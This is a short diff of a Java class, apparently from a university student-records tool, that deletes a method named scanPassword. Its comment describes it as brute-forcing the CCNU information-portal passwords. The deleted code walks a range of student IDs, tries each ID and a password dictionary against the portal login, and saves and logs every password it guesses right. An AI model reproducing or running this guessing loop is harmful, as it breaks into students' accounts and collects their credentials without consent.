@@ -5,7 +5,6 @@ import org.hibernate.Session;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import tool.HibernateUtil;
-import tool.ccnu.CCNUPortal;
 import tool.ccnu.student.detailInfo.ManageStudentAllInfo;
 
 import java.util.List;
@@ -143,35 +142,5 @@ public class ManageStudents {
 		studentsEntity.setPassword(password);
 		HibernateUtil.addOrUpdateEntity(studentsEntity);
 	}
-
-	/**
-	 * 暴力破解信息门户账号密码
-	 *
-	 * @param start 开始的学号
-	 * @param end   结束的学号
-	 * @param pass  密码字典,同时还会探测和账号一样的密码
-	 * @return 成功猜对的个数
-	 */
-	public static int scanPassword(int start, int end, String pass[]) {
-		int re = 0;
-		for (int i = start; i <= end; i++) {
-			String xh = Integer.toString(i);
-			if (CCNUPortal.XHMMisTrue(xh, xh)) {
-				re++;
-				update_PasswordToSQL(xh, xh);
-				log.info("成功猜对账号{}密码{}", xh, xh);
-			} else {
-				for (String one : pass) {
-					if (CCNUPortal.XHMMisTrue(xh, one)) {
-						re++;
-						update_PasswordToSQL(xh, one);
-						log.info("成功猜对账号{}密码{}", xh, one);
-					}
-				}
-			}
-		}
-		return re;
-	}
-
 
 }
